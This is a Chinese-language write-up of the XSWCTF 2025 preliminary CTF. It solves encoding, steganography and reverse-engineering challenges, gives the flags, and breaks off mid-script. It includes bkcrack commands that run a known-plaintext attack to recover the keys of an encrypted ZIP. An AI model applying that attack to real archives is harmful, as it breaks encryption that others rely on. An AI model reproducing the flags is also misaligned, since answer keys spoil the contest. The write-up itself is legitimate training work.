# [个人队伍] XSWCTF2025初赛的Writeup (30+题)

> 3人赛
>
> # XSWCTF 2025 初赛
>
> **200**支队伍已报名
>
> 开始时间
>
> 2025年11月14日晚上9点00分
>
> 结束时间
>
> 2025年11月16日晚上9点00分
>
> 本次比赛为**中山大学、华南师范大学、暨南大学**联合举办，由**暨大 Xp0int 团队、华师 Sloth 团队、中大 W4terDr0p 团队**联合命题
>
> 旨在培养同学们对网络安全竞赛的兴趣，寻找对网络安全技术感兴趣的小伙伴们
>
> 为 Xp0int、Sloth 、W4terDr0p 战队纳新挖掘优秀人才，注入新生力量
>
> 初赛，参上！
>
> ## 比赛时间
>
> 北京时间 **2025 年 11 月 14 日晚 21:00** 开始，至 **2025 年 11 月 16 日晚 21:00** 结束。
>
> ## 赛制规则
>
> 1. 此次比赛题目的flag格式为：**^XSWCTF\{[^}]+\}$**，请提交包含 `XSWCTF{}` 的完整 `flag` 来进行得分。
> 2. 采用动态分值，每道题目的分值会随着通过人数的增加而减少，减少的速度与题目预设难度相关。
> 3. 最终排名根据总分确定，在得分相同的情况下，越早达到这一分值的队伍排名越高。
> 4. 前三支成功解题的队伍将会获得基于当前题目分值的加分奖励，比例分别为 5%，3% 和 1%。
> 5. 本次比赛中，同一队伍最多开启 **三个** 容器实例。
>
> ## 诚信比赛承诺书
>
> 各位同学，你们好！继续比赛我们将认为你已知悉并同意下列事项：
>
> 1. 选手应该只针对特定题目进行合理测试，不应该攻击比赛平台（即本网站）。做题过程中可以合理进行自动化尝试，可以利用题目漏洞解题，但不可以利用比赛平台漏洞、恶意干扰比赛正常运行。
>
> 2. 本比赛为三人组队线上赛，所有题目都可以独立完成，即使看起来似乎不可能。比赛完全结束前，无论出于何种理由和目的，以下行为均属于作弊行为：
>
>    - 和他人讨论题目相关信息；
>    - 向他人提供题目相关信息；
>    - 使用他人提供或泄露的题目相关信息；
>
>    > **他人：** 包括但不限于同学、室友等，但主办方，裁判组及出题人除外。 **题目相关信息：** 包括但不限于队伍 token、题目附件、题目链接、解题提示、解题思路、题目答案等。
>
> 3. 我们给予参赛选手极高的信任，但裁判组有权通过其他证据及风控系统数据判定选手的作弊行为，有权取消作弊选手的参赛资格并予以公示。
>
> 4. 如果参赛选手不确定某个行为是否属于上述作弊行为的例外情况，可以向主办方，裁判组及出题人咨询，不可以直接尝试。
>
> 5. 如果参赛选手发现比赛作弊现象，应该拒绝参与并告知裁判组。
>
> **`Hack for fun not for profit.`**
>
> ## 比赛规则
>
> 1. 本次比赛为三人组队赛。
> 2. 参赛选手如有任何违规行为，将被取消比赛成绩和参赛资格，并加入长期禁赛黑名单。
> 3. 比赛结束后所有选手需要在 **24 小时内** 提交 WriteUp 至平台。
> 4. 禁止不同参赛选手合作，或者共享 `flag` 字符串、及题目提示等任何比赛相关信息。
> 5. 禁止攻击比赛平台，如果发现平台漏洞，请务必向我们报告。如根据风控数据发现此类行为，将取消参赛成绩。
> 6. 禁止在比赛中妨碍其他选手解题，例如对题目环境进行破坏从而导致他人无法正常作答。
> 7. 禁止往比赛平台发送大量流量，**没有任何题目需要使用扫描器**。
> 8. 禁止对提交的 `flag` 进行爆破，且提交有速率限制。如根据风控数据发现此类行为，可能对账户进行短期或取消参赛成绩。
> 9. 获奖选手必须提交 **完整的解题报告**，不提交者视为放弃参赛成绩。
> 10. 比赛主办方有权修改包括赛题、规则等一切事项，比赛解释权归主办方所有。



# Week

## Misc

### Easy_Base

#### 解题过程

看到题目里直接就给出了题目

```
WA====wUVw====wQVA====gRew====ARZQ====gbaQ====QcdQ====QZdQ====gYaQ====QZcg====QadA====wXcw====QYbg====wZdQ====Qacw====QYZw====AbYQ====AZaQ====wbcg====QZZw====Qacw====Qf
```

这看起来像`Base64`但是直接解码出不来

这么短的文本**猜测**如果它解码出来应该直接就是flag了

已知flag格式是`XSWCTF{}`

我们将flag格式XSWCTF扔进Base64编码一下试试

```
XSWCTF{} -> WFNXQ1RGe30=
```

和题目的格式不太像，我们试试**单字符编码**试试

```
X -> WA==
S -> Wu==
W -> Vw==
C -> Qw==
T -> VA==
F -> Rg==
{ -> ew==
} -> fQ==
```

这下就懂了，只要将题目逆一下就可以了，编辑一下下得到

```
WA==Uw==Vw==Qw==VA==Rg==ew==RA==ZQ==bg==aQ==cQ==dQ==ZQ==dQ==Yg==aQ==ZQ==cg==aQ==dA==Xw==cw==YQ==bg==Zw==dQ==aQ==cw==YQ==Zw==bA==YQ==ZA==aQ==bw==cg==ZQ==Zw==aQ==cw==fQ==
```

Base64解码得到

```
XSWCTF{Deniqueubierit_sanguisagladioregis}
```

**得到：**XSWCTF{Deniqueubierit_sanguisagladioregis}



### ✋😭✋

#### 解题过程

下载打开看到题目

```
📧💖💊💞📧💖💉💍📧💖💉👿📧💖💉👽📧💖💊💞📧💖💉💍📧💖💉👿📧💖💉👸📧💖💊💞📧💖💉💍📧💖💉👿📧💖💉👼📧💖💊💞📧💖💉💍📧💖💉👾📧💖💉💨📧💖💊💞📧💖💉💍📧💖💉👿📧💖💉👹📧💖💊💞📧💖💉💍📧💖💉👾📧💖💉💫📧💖💊💞📧💖💉💍📧💖💉👿📧💖💉💠📧💖💊💞📧💖💉💍📧💖💉👾📧💖💉💧📧💖💊💞📧💖💉💍📧💖💉👾📧💖💉💙📧💖💊💞📧💖💉💍📧💖💉👾📧💖💉💉📧💖💊💞📧💖💉💍📧💖💉👾📧💖💉💪📧💖💊💞📧💖💉💍📧💖💉👾📧💖💉💖📧💖💊💞📧💖💉💍📧💖💉👾📧💖💉💕📧💖💊💞📧💖💉💍📧💖💉👾📧💖💉💕📧💖💊💞📧💖💉💍📧💖💉👿📧💖💉💄📧💖💊💞📧💖💉💍📧💖💉👾📧💖💉💖📧💖💊💞📧💖💉💍📧💖💉👿📧💖💉👸📧💖💊💞📧💖💉💍📧💖💉👿📧💖💉💄📧💖💊💞📧💖💉💍📧💖💉👿📧💖💉👸📧💖💊💞📧💖💉💍📧💖💉👾📧💖💉💕📧💖💊💞📧💖💉💍📧💖💉👿📧💖💉💄📧💖💊💞📧💖💉💍📧💖💉👾📧💖💉💖📧💖💊💞📧💖💉💍📧💖💉👿📧💖💈💳📧💖💊💞📧💖💉💍📧💖💉👾📧💖💉💜📧💖💊💞📧💖💉💍📧💖💉👾📧💖💉💘📧💖💊💞📧💖💉💍📧💖💉👿📧💖💉👷📧💖💊💞📧💖💉💍📧💖💉👾📧💖💉💘📧💖💊💞📧💖💉💍📧💖💉👾📧💖💉💉📧💖💊💞📧💖💉💍📧💖💉👾📧💖💉💜📧💖💊💞📧💖💉💍📧💖💉👾📧💖💉💖📧💖💊💞📧💖💉💍📧💖💉👿📧💖💈💳📧💖💊💞📧💖💉💍📧💖💉👾📧💖💉💞📧💖💊💞📧💖💉💍📧💖💉👿📧💖💉💢
```

很抽象，**猜测**这应该是一种`emoji表情符号编码`

而且是**多重编码**，这是我个人总结出来的，如果一个编码后的文本很有规律甚至重复、循环那很大概率就是多次编码了

然后我在网上一直找啊找了各种各样的emoji编码在线网站

但是它们要么只是翻译`📧 -> 信件`要么就是出错，都**有想点打出题人的冲动了**：网上这么多emoji编码的在线网站，鬼知道你是用的哪个编的码啊？

然后呢，我也沉下心来学习了一下，看了一点emoji编码的教程，然后知道了emoji表情符号编码它还有另一个比较文艺一点的名字叫**`Base100`**

然后我直接搜索`Base100在线解码`，发现可行，多重解码成功得出了flag

**得到：**XSWCTF{B4$E100_1S_S0_1N73R3$71N9}



### 哈基米

#### 解题过程

下载打开，看到题目

```
南北绿豆哈步得龙哈奈诺娜美嘎。哦吗吉利步马美哈奈南北绿豆？椰奶龙诺吗哈里基哈基米，阿西噶压马哈砸啊菇哈基米，‍‍‍‌﻿‌‬‌哦吗吉利美砸找西哈库路曼波；阿西噶压步得窝哈步瓦南北绿豆‍‍‍﻿﻿﻿‬‬？奈诺娜美嘎没哈一达一哈步南北绿豆‍﻿﻿‌‍﻿‌﻿；‍‬‍‍‬﻿‬‍欧莫季里得龙哈步阿西噶压。‬‌‬‬‌‌‌‌哦吗吉利马美哈奈诺吗买哦吗吉利？椰奶龙买哒哒哈一找哈基米﻿﻿﻿﻿‌‍‬‬；奈诺娜美嘎龙美瓦马阿西噶压；窝那没撸多美哈一啊阿西噶压‌‌‌‌‌﻿‌‬。‌‌‌‌‌﻿‌‌奈诺娜美嘎阿哈奈美得哦吗吉利；哦吗吉利哈步啊得哈窝那没撸多？奈诺娜美嘎一啊阿美瓦阿西噶压。哈基米马美哈奶啊酷哈基米？哈基米美奶诺诺哈库路曼波，‌‌‌‌‍‬‍‌欧莫季里季窝吉美奶不喵哦吗吉利‌‌‌‌‌﻿‍﻿？欧莫季里哈菇莫绿哈库路曼波；哦吗吉利波得啊奈奈子哈基米‌‌‌‌‌﻿‬‌；欧莫季里椰哈一找阿西噶压？‌‌‌‌‌﻿‌‍库路曼波龙美瓦马美欧莫季里‌‌‌‌‌﻿‍‬。哈基米哈一啊阿哈奈美奈诺娜美嘎，哦吗吉利得哈步啊得哈阿西噶压‌‌‌‌‍‬‌﻿，‌‌‌‌‌‬﻿‍哈基米步基米哈季哒哦吗吉利‌‌‌‌‍‬‌‬；椰奶龙绿哈奶啊那哈步哦吗吉利‌‌‌‌‌﻿‌‬，哈基米一压哈一啊阿美窝那没撸多‌‌‌‌‌﻿‬‍‌‌‌‌‌﻿‌﻿，奈诺娜美嘎季美步哈美哈基米‌‌‌‌‌‬﻿‍；‌‌‌‌‌﻿‍‌库路曼波哒买哈美库路曼波？南北绿豆窝嘎美砸瓦南哈窝那没撸多。窝那没撸多波瓦噶哈菇瓦买欧莫季里‌‌‌‌‌﻿‌‌；南北绿豆哈一达一奈欧莫季里；哈基米奈子椰哈窝欧莫季里‌‌‌‌‌﻿‍﻿？库路曼波子塔美龙窝那没撸多‌‌‌‌‍‬‍‬。椰奶龙美波哈一米哦吗吉利‌‌‌‌‌‬﻿‍；南北绿豆南美砸不椰哈南北绿豆；南北绿豆砸美奶哈菇哈基米；‌‌‌‌‍‬‌‍椰奶龙莫绿美奶诺诺哦吗吉利；阿西噶压美奶美马阿西噶压。哦吗吉利哈一找龙美瓦马库路曼波‌‌‌‌‍‬‌‬？奈诺娜美嘎美哈一啊阿奈诺娜美嘎，阿西噶压哈奈美得哈步椰奶龙；窝那没撸多啊得买买阿西噶压。‌‌‌‌‍‬‍‍椰奶龙哒哒哈步哈基米，哦吗吉利得龙哈步南北绿豆。欧莫季里马美哈奈诺吗哈阿西噶压？‌‌‌‌‌﻿‌﻿欧莫季里砸米哪哈奈诺娜美嘎。椰奶龙砸啊菇哈哈基米？‌‌‌‌‌‬﻿‍欧莫季里美窝嘎哈南北绿豆，欧莫季里奶啊那哈砸阿西噶压。欧莫季里美奶美龙椰奶龙‌‌‌‌‌﻿‍‬，窝那没撸多马呀哈步得基哈阿西噶压，‌‌‌‌‌﻿‬‌窝那没撸多步哒哪哈步奈诺娜美嘎，库路曼波哒我哈砸啊菇库路曼波；窝那没撸多奈奈子库美步啊阿西噶压。库路曼波撸美瓦找撸哈步哈基米？哈基米基米哈砸美奶美哈基米。‌‌‌‌‍‬‍‬哦吗吉利奶不喵哈奶啊那奈诺娜美嘎；阿西噶压哈砸米哪哈砸啊库路曼波‌‌‌‌‍‬‌‬，阿西噶压菇哈步瓦奶哈奈诺娜美嘎；阿西噶压窝达北哈欧莫季里‌‌‌‌‍‬‌﻿‌‌‌‌‌﻿‬‍。阿西噶压窝达北哈一找米欧莫季里，阿西噶压美季美步奈南北绿豆；阿西噶压奈子季美步啊奈诺娜美嘎？奈诺娜美嘎撸美瓦找撸哈步哈基米。奈诺娜美嘎基米哈砸美奶哈欧莫季里‌‌‌‌‌﻿‌‍；阿西噶压砸美奶哈哈基米，阿西噶压一达一美龙马椰奶龙。‌‌‌‌‍‬‍‌欧莫季里呀哈步哒我哈窝窝那没撸多‌‌‌‌‌﻿‌‌？哦吗吉利达北哈一找米美奈诺娜美嘎；哦吗吉利季美步奈库路曼波，库路曼波奈子椰哈奈诺娜美嘎。南北绿豆美窝嘎美哦吗吉利，‌‌‌‌‍‬‍‌库路曼波砸瓦南哈波瓦噶阿西噶压，欧莫季里哈菇瓦买哈库路曼波？‌‌‌‌‌﻿‬‌哈基米一达一哈步哒我哈基米，南北绿豆哈砸啊菇美砸找哦吗吉利‌‌‌‌‍‬‌‬，阿西噶压西哈一米南哈步南北绿豆；哦吗吉利诺那哈步得库路曼波；哈基米龙哈步马美哈奈诺娜美嘎？椰奶龙奈诺吗奈奈哈基米，欧莫季里子季哈砸米哪欧莫季里，哈基米哈砸子哪哈奈莫窝那没撸多？奈诺娜美嘎撸美奶诺诺阿西噶压；南北绿豆美奶诺诺窝那没撸多。哦吗吉利哈步得菇哈步得窝那没撸多，哈基米龙哈步马美哈奈椰奶龙。阿西噶压诺吗买买哒哒哈基米。
```

看到是**哈基米编码**，直接就去搜`哈基米在线解码`，找了一段时间发现都解不出来

然后我又回到文本，审计一下文本，发现它好像又一些地方有奇怪的框框，立刻就想到了零宽隐写。**才发现**原来在markdown里的文本框里输入零宽文本是能看出点点点的

直接搜索`零宽隐写在线解码`，得到了原文本，和隐藏文本

```
南北绿豆哈步得龙哈奈诺娜美嘎。哦吗吉利步马美哈奈南北绿豆？椰奶龙诺吗哈里基哈基米，阿西噶压马哈砸啊菇哈基米，哦吗吉利美砸找西哈库路曼波；阿西噶压步得窝哈步瓦南北绿豆？奈诺娜美嘎没哈一达一哈步南北绿豆；欧莫季里得龙哈步阿西噶压。哦吗吉利马美哈奈诺吗买哦吗吉利？椰奶龙买哒哒哈一找哈基米；奈诺娜美嘎龙美瓦马阿西噶压；窝那没撸多美哈一啊阿西噶压。奈诺娜美嘎阿哈奈美得哦吗吉利；哦吗吉利哈步啊得哈窝那没撸多？奈诺娜美嘎一啊阿美瓦阿西噶压。哈基米马美哈奶啊酷哈基米？哈基米美奶诺诺哈库路曼波，欧莫季里季窝吉美奶不喵哦吗吉利？欧莫季里哈菇莫绿哈库路曼波；哦吗吉利波得啊奈奈子哈基米；欧莫季里椰哈一找阿西噶压？库路曼波龙美瓦马美欧莫季里。哈基米哈一啊阿哈奈美奈诺娜美嘎，哦吗吉利得哈步啊得哈阿西噶压，哈基米步基米哈季哒哦吗吉利；椰奶龙绿哈奶啊那哈步哦吗吉利，哈基米一压哈一啊阿美窝那没撸多，奈诺娜美嘎季美步哈美哈基米；库路曼波哒买哈美库路曼波？南北绿豆窝嘎美砸瓦南哈窝那没撸多。窝那没撸多波瓦噶哈菇瓦买欧莫季里；南北绿豆哈一达一奈欧莫季里；哈基米奈子椰哈窝欧莫季里？库路曼波子塔美龙窝那没撸多。椰奶龙美波哈一米哦吗吉利；南北绿豆南美砸不椰哈南北绿豆；南北绿豆砸美奶哈菇哈基米；椰奶龙莫绿美奶诺诺哦吗吉利；阿西噶压美奶美马阿西噶压。哦吗吉利哈一找龙美瓦马库路曼波？奈诺娜美嘎美哈一啊阿奈诺娜美嘎，阿西噶压哈奈美得哈步椰奶龙；窝那没撸多啊得买买阿西噶压。椰奶龙哒哒哈步哈基米，哦吗吉利得龙哈步南北绿豆。欧莫季里马美哈奈诺吗哈阿西噶压？欧莫季里砸米哪哈奈诺娜美嘎。椰奶龙砸啊菇哈哈基米？欧莫季里美窝嘎哈南北绿豆，欧莫季里奶啊那哈砸阿西噶压。欧莫季里美奶美龙椰奶龙，窝那没撸多马呀哈步得基哈阿西噶压，窝那没撸多步哒哪哈步奈诺娜美嘎，库路曼波哒我哈砸啊菇库路曼波；窝那没撸多奈奈子库美步啊阿西噶压。库路曼波撸美瓦找撸哈步哈基米？哈基米基米哈砸美奶美哈基米。哦吗吉利奶不喵哈奶啊那奈诺娜美嘎；阿西噶压哈砸米哪哈砸啊库路曼波，阿西噶压菇哈步瓦奶哈奈诺娜美嘎；阿西噶压窝达北哈欧莫季里。阿西噶压窝达北哈一找米欧莫季里，阿西噶压美季美步奈南北绿豆；阿西噶压奈子季美步啊奈诺娜美嘎？奈诺娜美嘎撸美瓦找撸哈步哈基米。奈诺娜美嘎基米哈砸美奶哈欧莫季里；阿西噶压砸美奶哈哈基米，阿西噶压一达一美龙马椰奶龙。欧莫季里呀哈步哒我哈窝窝那没撸多？哦吗吉利达北哈一找米美奈诺娜美嘎；哦吗吉利季美步奈库路曼波，库路曼波奈子椰哈奈诺娜美嘎。南北绿豆美窝嘎美哦吗吉利，库路曼波砸瓦南哈波瓦噶阿西噶压，欧莫季里哈菇瓦买哈库路曼波？哈基米一达一哈步哒我哈基米，南北绿豆哈砸啊菇美砸找哦吗吉利，阿西噶压西哈一米南哈步南北绿豆；哦吗吉利诺那哈步得库路曼波；哈基米龙哈步马美哈奈诺娜美嘎？椰奶龙奈诺吗奈奈哈基米，欧莫季里子季哈砸米哪欧莫季里，哈基米哈砸子哪哈奈莫窝那没撸多？奈诺娜美嘎撸美奶诺诺阿西噶压；南北绿豆美奶诺诺窝那没撸多。哦吗吉利哈步得菇哈步得窝那没撸多，哈基米龙哈步马美哈奈椰奶龙。阿西噶压诺吗买买哒哒哈基米。
```

```
哈基米方言：20d7816c-b293-407f-abe3-68fbc91d0d8b
```

一开始不熟悉这个零宽隐写，没有注意原文本，也没有注意到`哈基米方言：`这几个字，就拿着这串东西`20d7816c-b293-407f-abe3-68fbc91d0d8b`想半天这是什么玩意儿？UUID？区块链？TCP？IP？

然后我又又又沉下心来才知道这是`KEY`，第一次见长这样的KEY没反应过来

然后又是多重哈基米解码直接就得到了flag

**得到：**XSWCTF{HAh4HaH4J1jiJlj1m1MiM1Ml}



### 认识一下SCNU吧

#### 解题过程

下载得到`flag.png`，首先看一下属性，没东西

接着WinHex里看看有什么东西，看头，看尾，没问题

唉？看到有个PK的东西，就想到了压缩包，直接用`foremost`看一看

```cmd
D:\Downloads>foremost flag.png
foremost: D:\Program Files\foremost\foremost.conf: No such file or directory
Processing: flag.png
|foundat=flag.txt竳貈?爹}婔諯.蹵??馀    迣馚ZR飾莣缗Y|捦靹|9PK
foundat=plaintextA悖GM毰?1U羻r衉岙鶸L衑琈邜儀衫?逷K?
*|
```

得到了`00000233.zip`里面有`flag.txt`但是解压需要密码

把压缩包扔进`WinHex`里再看看，没有密码

看看是不是伪加密，不是

看看压缩包，题目有没有什么提示，没有

注意力回到图片，没招了后扔进`StegSolve`看看是不是`LSB`隐写

`Alpha plane 0`找到一个二维码，但是怎么拿下来呢？直接QQ截图吧，然后扔进`草料二维码在线解码`得到文本

```
plaintext：W0W_Y0U_f0UND_th3_PL4iNt3Xt
```

这有什么用？试试XSWCTF{W0W_Y0U_f0UND_th3_PL4iNt3Xt}不行

然后找了很久，**都给我找饿了**，才了解到原来是**`已知明文攻击`**才想起来压缩包里面有个`plaintext`

学习了一下，一开始用`Archpr`发现**慢死了**

后来找到了`bkcrack`**呜呜呜又要下载，好多好杂的工具哇，电脑乱乱的好烦**

下面直接开始操作

```cmd
C:\Users\probie\Desktop\writeup\认识一下\output\zip>bkcrack -C 00000233.zip -c plaintext -p plaintext.txt
bkcrack 1.8.1 - 2025-10-25
[16:29:35] Z reduction using 20 bytes of known plaintext
100.0 % (20 / 20)
[16:29:35] Attack on 377200 Z values at index 6
Keys: 16dfa261 e63d4d2d 236c4c2c
10.7 % (40546 / 377200)
Found a solution. Stopping.
You may resume the attack with the option: --continue-attack 40546
[16:29:43] Keys
16dfa261 e63d4d2d 236c4c2c
```

得到三个Key：`16dfa261`、`e63d4d2d`、`236c4c2c`继续

```cmd
C:\Users\probie\Desktop\writeup\认识一下\output\zip>bkcrack -C 00000233.zip -c flag.txt -k 16dfa261 e63d4d2d 236c4c2c -d flag.txt
bkcrack 1.8.1 - 2025-10-25
[16:30:46] Writing deciphered data flag.txt
Wrote deciphered data (not compressed).
```

双击打开生成的flag.txt

**得到：**XSWCTF{SCNU_1S_7H3_OnLy_211_1N_Gd}



### 01 交响曲 **(尝试)**

#### 尝试过程

没做出来但是做了很多尝试

**尝试**

- 二维码

  在网上搜了相关01的题目，发现都是二维码

  然后抄录了网上一段还原二维码的python代码，输出结果不像二维码

  然后我也用python获取到了`0`和`1`的字符总和，发现不是平方数，走不通

- 文件

  我猜测是某种文件的二进制

  看到前四个数据`00000 11111 00001 1000`用`程序员计算器`转16进制是`00 1F 01 08`发现没有这个文件头，走不通

- 文本

  我用python将所有二进制补全`8`位，然后转`ASCll`

  发现不是可读文本，走不通



### 问卷 **(复现)**

#### 复现过程

呜呜呜怎么突然冒出来这么一道题，还有`200`分，去吃夜宵了没有做

不过夜宵也是真的挺好吃的，那到也不算亏

**得到：**XSWCTF{hope_you_enjoy_this_game}



## Reverse

### CO+2FE=

#### 解题过程

下载解压得到`C2.class`扔进`jd-gui`里反编译一下看到源码

```java
import java.io.PrintStream;
import java.util.Scanner;

public class C2
{
  public static void main(String[] paramArrayOfString)
  {
    String str1 = "YTXDUG{4_tjnq13_xbz_0g_3od0ejoh}";
    int i = 1;
    Scanner localScanner = new Scanner(System.in);
    System.out.print("Please input the flag: ");
    String str2 = localScanner.nextLine();
    StringBuilder localStringBuilder = new StringBuilder();
    for (int j = 0; j < str2.length(); j++)
    {
      char c = str2.charAt(j);
      if (Character.isLowerCase(c)) {
        localStringBuilder.append((char)((c - 'a' + i) % 26 + 97));
      } else if (Character.isUpperCase(c)) {
        localStringBuilder.append((char)((c - 'A' + i) % 26 + 65));
      } else {
        localStringBuilder.append(c);
      }
    }
    if (localStringBuilder.toString().equals(str1)) {
      System.out.println("Correct! Well done.");
    } else {
      System.out.println("Incorrect flag.");
    }
  }
}
```

这里是一个简单的古典加密，直接写一个解密程序

```java
public class Decrypt {
    public static void main(String[] args) {
        String str1 = "YTXDUG{4_tjnq13_xbz_0g_3od0ejoh}";
        int shift = 1;
        StringBuilder result = new StringBuilder();
        for (int i = 0; i < str1.length(); i++) {
            char c = str1.charAt(i);
            if (Character.isLowerCase(c)) {
                char shifted = (char) ((c - 'a' - shift + 26) % 26 + 'a');
                result.append(shifted);
            } else if (Character.isUpperCase(c)) {
                char shifted = (char) ((c - 'A' - shift + 26) % 26 + 'A');
                result.append(shifted);
            } else {
                result.append(c);
            }
        }
        System.out.println(result.toString());
    }
}
```

运行得到flag

**得到：**flag: XSWCTF{4_simp13_way_0f_3nc0ding}



### DEBIG

#### 解题过程

看到题目名称和题目介绍`DEBIG -> debug`、`完了这加密算法怎么这么复杂 -> debug`

下载解压仍经IDA查看源码

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  _QWORD v4[4]; // [rsp+20h] [rbp-C0h] BYREF
  _BYTE v5[16]; // [rsp+40h] [rbp-A0h] BYREF
  _QWORD v6[4]; // [rsp+50h] [rbp-90h] BYREF
  char Str[100]; // [rsp+70h] [rbp-70h] BYREF
  int j; // [rsp+D8h] [rbp-8h]
  int i; // [rsp+DCh] [rbp-4h]

  sub_402480(argc, argv, envp);
  printf("please input your flag:");
  scanf("%s", Str);
  if ( strlen(Str) == 32 )
  {
    if ( (unsigned int)sub_401550(&unk_404040, v6, 128LL) )
    {
      v4[0] = v6[0];
      v4[1] = v6[1];
      v4[2] = v6[2];
      sub_401B1C(&unk_404060, v5, v4);
      for ( i = 0; i <= 31; ++i )
        Str[i] ^= v5[i / 2];
      for ( j = 0; j <= 31; ++j )
      {
        if ( Str[j] != byte_404020[j] )
        {
          printf("flag is wrong!");
          return 0;
        }
      }
      printf("flag is right!");
    }
    return 0;
  }
  else
  {
    printf("flag is wrong!");
    return 0;
  }
}
```

先不看源码，直接在这里打上断点

```c
if ( Str[j] != byte_404020[j] )
```

运行调试，简单看一下这里输入`32`个字符`aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa`

得到一些数据

```nasm
.data:0000000000404020 byte_404020     db 31h, 3Ah, 93h, 87h, 0B4h, 0A6h, 0A3h, 0AAh, 59h, 1Ch
.data:0000000000404020                                         ; DATA XREF: main+11F↑o
.data:000000000040402A                 db 24h, 1Fh, 61h, 66h, 45h, 57h, 87h, 0BBh, 0A5h, 0FEh
.data:0000000000404034                 db 0D4h, 0DCh, 0B4h, 0E2h, 1Ch, 43h, 0EBh, 86h, 0F5h, 0F7h
.data:000000000040403E                 db 6Fh, 27h
```

发现这并不直接是flag，再看一下源码发现它有加密的程序，获取到关键数据**v5**

```nasm
debug007:000000000060FDB0                 db  69h ; i
debug007:000000000060FDB1                 db 0C4h
debug007:000000000060FDB2                 db 0E0h
debug007:000000000060FDB3                 db 0D8h
debug007:000000000060FDB4                 db  6Ah ; j
debug007:000000000060FDB5                 db  7Bh ; {
debug007:000000000060FDB6                 db    4
debug007:000000000060FDB7                 db  30h ; 0
debug007:000000000060FDB8                 db 0D8h
debug007:000000000060FDB9                 db 0CDh
debug007:000000000060FDBA                 db 0B7h
debug007:000000000060FDBB                 db  80h
debug007:000000000060FDBC                 db  70h ; p
debug007:000000000060FDBD                 db 0B4h
debug007:000000000060FDBE                 db 0C5h
```

偏古典密码，直接写一个解密脚本

```python
byte_404020 = [
    0x31, 0x3A, 0x93, 0x87, 0xB4, 0xA6, 0xA3, 0xAA,
    0x59, 0x1C, 0x24, 0x1F, 0x61, 0x66, 0x45, 0x57,
    0x87, 0xBB, 0xA5, 0xFE, 0xD4, 0xDC, 0xB4, 0xE2,
    0x1C, 0x43, 0xEB, 0x86, 0xF5, 0xF7, 0x6F, 0x27
]

v5 = [
    0x69, 0xC4, 0xE0, 0xD8, 0x6A, 0x7B, 0x04, 0x30,
    0xD8, 0xCD, 0xB7, 0x80, 0x70, 0xB4, 0xC5, 0x5A
]

# flag[i] = byte_404020[i] ^ v5[i//2]
flag = []
for i in range(32):
    original_byte = byte_404020[i] ^ v5[i // 2]
    flag.append(chr(original_byte))

print(flag)
```

运行解密程序

```cmd
C:\Users\probie\Desktop\writeup\debug>python payload.py
XSWCTF{r3v_debug_ch3ck4bl3_2025}
```

**得到：**XSWCTF{r3v_debug_ch3ck4bl3_2025}



### abcd

#### 解题过程

下载解压得到`a.bc`这是什么？搜一下，得知是汇编语言编译的程序，用`clang`反编译

(哎？我clang哪去了？又给我的Windows安全中心删了？？？！哦，没有，我安装在WSL2上了...)

```shell
probie@Probie:/mnt/d/Downloads/a$ clang a.bc -o a
probie@Probie:/mnt/d/Downloads/a$ file a
a: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=cbda4ca3e4b308d5cf14e38de24773b66bf0b4de, for GNU/Linux 3.2.0, not stripped
```

直接将`a`扔进IDA里看看

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  bool v4; // [rsp+1h] [rbp-18Fh]
  int j; // [rsp+4h] [rbp-18Ch]
  int v6; // [rsp+8h] [rbp-188h]
  int i; // [rsp+Ch] [rbp-184h]
  char s[112]; // [rsp+10h] [rbp-180h] BYREF
  _BYTE v9[268]; // [rsp+80h] [rbp-110h] BYREF
  int v10; // [rsp+18Ch] [rbp-4h]

  v10 = 0;
  boom(v9, argv, envp);
  printf("flag: ");
  memset(s, 0, 0x64uLL);
  fgets(s, 100, _bss_start);
  for ( i = 0; ; ++i )
  {
    v4 = 0;
    if ( s[i] )
      v4 = s[i] != 10;
    if ( !v4 )
      break;
  }
  s[i] = 0;
  if ( i == 34LL )
  {
    v6 = 1;
    for ( j = 0; (unsigned __int64)j < 0x22; ++j )
    {
      if ( table[(unsigned __int8)((17 * j + 13) ^ s[j])] != ciphertext[j] )
      {
        v6 = 0;
        break;
      }
    }
    if ( v6 )
      puts("Congratulations! You got the flag!");
    else
      puts("Sorry, wrong flag.");
    return 0;
  }
  else
  {
    printf("Wrong length! \n");
    return 1;
  }
}
```

这里我当时有点困了，看不进去了，直接扔给大模型给我写一个解密脚本

```python
table = [
    # 0x4060 (11字节)
    0x0C, 0xE2, 0x03, 0x08, 0x9E, 0x14, 0x8F, 0x2B, 0xEA, 0x4F, 0x26,
    # 0x406B (10字节)
    0x06, 0xDE, 0xA6, 0xEF, 0x5E, 0xBD, 0xDD, 0xF4, 0xA2, 0x3F,
    # 0x4075 (10字节)
    0xCD, 0x62, 0x74, 0xD8, 0x25, 0xFE, 0x8A, 0x93, 0x38, 0xF7,
    # 0x407F (10字节)
    0x7F, 0x16, 0xC5, 0x50, 0x4C, 0x54, 0x60, 0x6E, 0x10, 0xB7,
    # 0x4089 (10字节)
    0xF2, 0xAB, 0x5B, 0x73, 0xB2, 0xE8, 0xA4, 0x7C, 0x72, 0x5D,
    # 0x4093 (10字节)
    0x66, 0xE7, 0xFF, 0x86, 0xDA, 0xCC, 0x87, 0xC6, 0x1B, 0x47,
    # 0x409D (10字节)
    0x28, 0xC0, 0xED, 0x2A, 0xC7, 0x7D, 0x1F, 0xFB, 0xE5, 0x53,
    # 0x40A7 (11字节)
    0x64, 0x09, 0xB9, 0x51, 0x49, 0x27, 0x80, 0xE9, 0x3E, 0x58, 0xB5,
    # 0x40B2 (10字节)
    0xD1, 0xA0, 0x71, 0x5C, 0x9C, 0xEC, 0xF1, 0xD5, 0xAD, 0xE6,
    # 0x40BC (10字节)
    0xC9, 0x39, 0x9F, 0x2E, 0x23, 0xB6, 0xD3, 0x82, 0xFD, 0xA3,
    # 0x40C6 (10字节)
    0x31, 0x79, 0xB4, 0x3C, 0xF5, 0xD6, 0x57, 0x3B, 0x99, 0x5F,
    # 0x40D0 (10字节)
    0x0F, 0x41, 0x89, 0x0E, 0xFA, 0x37, 0x4A, 0xD4, 0xF3, 0x90,
    # 0x40DA (10字节)
    0x61, 0x7E, 0x34, 0xA1, 0xB0, 0x9B, 0xD9, 0x11, 0x6A, 0xD2,
    # 0x40E4 (10字节)
